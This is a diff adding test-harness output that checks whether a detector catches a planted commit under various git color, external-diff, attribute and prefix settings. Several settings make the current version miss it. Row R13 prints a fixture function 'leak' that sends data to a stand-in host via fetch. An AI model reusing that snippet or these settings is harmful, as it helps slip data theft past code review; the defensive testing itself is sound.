@@ -1,0 +1,21 @@
+tip 837e8b22 X1 0e4c6f6a ADD 78b6e009 git git version 2.56.0
+R0 control (no config)             X1 L1 cur=limb 1: FIRES        fix=limb 1: FIRES        | ADD L1 cur=limb 1: FIRES  fix=limb 1: FIRES  L3 cur=limb 3: FIRES  fix=limb 3: FIRES
+R1 color.diff=always (repo)        X1 L1 cur=limb 1: does not fire fix=limb 1: FIRES        | ADD L1 cur=limb 1: does not fire fix=limb 1: FIRES  L3 cur=limb 3: does not fire fix=limb 3: FIRES
+R2 color.ui=always (repo)          X1 L1 cur=limb 1: does not fire fix=limb 1: FIRES        | ADD L1 cur=limb 1: does not fire fix=limb 1: FIRES  L3 cur=limb 3: does not fire fix=limb 3: FIRES
+R3 diff.external=silent (repo)     X1 L1 cur=limb 1: does not fire fix=limb 1: FIRES        | ADD L1 cur=limb 1: does not fire fix=limb 1: FIRES  L3 cur=limb 3: does not fire fix=limb 3: FIRES
+R4 GIT_EXTERNAL_DIFF=silent (env)  X1 L1 cur=limb 1: does not fire fix=limb 1: FIRES        | ADD L1 cur=limb 1: does not fire fix=limb 1: FIRES  L3 cur=limb 3: does not fire fix=limb 3: FIRES
+R5 info/attributes diff=ext+command X1 L1 cur=limb 1: does not fire fix=limb 1: FIRES        | ADD L1 cur=limb 1: does not fire fix=limb 1: FIRES  L3 cur=limb 3: does not fire fix=limb 3: FIRES
+R5g global attributesFile diff=ext X1 L1 cur=limb 1: does not fire fix=limb 1: FIRES        | ADD L1 cur=limb 1: does not fire fix=limb 1: FIRES  L3 cur=limb 3: does not fire fix=limb 3: FIRES
+R6 src/dstPrefix=x/,y/             X1 L1 cur=limb 1: does not fire fix=limb 1: FIRES        | ADD L1 cur=limb 1: does not fire fix=limb 1: FIRES  L3 cur=limb 3: does not fire fix=limb 3: FIRES
+R7 diff.noprefix                   X1 L1 cur=limb 1: FIRES        fix=limb 1: FIRES        | ADD L1 cur=limb 1: FIRES  fix=limb 1: FIRES  L3 cur=limb 3: FIRES  fix=limb 3: FIRES
+R8 diff.mnemonicPrefix             X1 L1 cur=limb 1: FIRES        fix=limb 1: FIRES        | ADD L1 cur=limb 1: FIRES  fix=limb 1: FIRES  L3 cur=limb 3: FIRES  fix=limb 3: FIRES
+R9 GIT_DIFF_OPTS=--unified=3       X1 L1 cur=limb 1: FIRES        fix=limb 1: FIRES        | ADD L1 cur=limb 1: FIRES  fix=limb 1: FIRES  L3 cur=limb 3: FIRES  fix=limb 3: FIRES
+R10 diff.algorithm=histogram       X1 L1 cur=limb 1: FIRES        fix=limb 1: FIRES        | ADD L1 cur=limb 1: FIRES  fix=limb 1: FIRES  L3 cur=limb 3: FIRES  fix=limb 3: FIRES
+R11 diff.relative=true             X1 L1 cur=limb 1: FIRES        fix=limb 1: FIRES        | ADD L1 cur=limb 1: FIRES  fix=limb 1: FIRES  L3 cur=limb 3: FIRES  fix=limb 3: FIRES
+R12 GIT_CONFIG_COUNT color (env)   X1 L1 cur=limb 1: does not fire fix=limb 1: FIRES        | ADD L1 cur=limb 1: does not fire fix=limb 1: FIRES  L3 cur=limb 3: does not fire fix=limb 3: FIRES
+R13 textconv strips imports (show) X1 L1 cur=limb 1: FIRES        fix=limb 1: FIRES        | ADD L1 cur=limb 1: FIRES  fix=limb 1: FIRES  L3 cur=limb 3: FIRES  fix=limb 3: FIRES
+   git show 78b6e009:src/fen.ts | head -2 =>
+      import { writeFileSync } from "node:fs";
+      export const leak = (s: string) => { writeFileSync("/tmp/x", s); return fetch("http://example.invalid/" + s); };
+R14 waiver pipe under color        name-only bytes: 0000000 s r c / f e n . t s \n  0000013 
+clone config clean of color./diff. keys
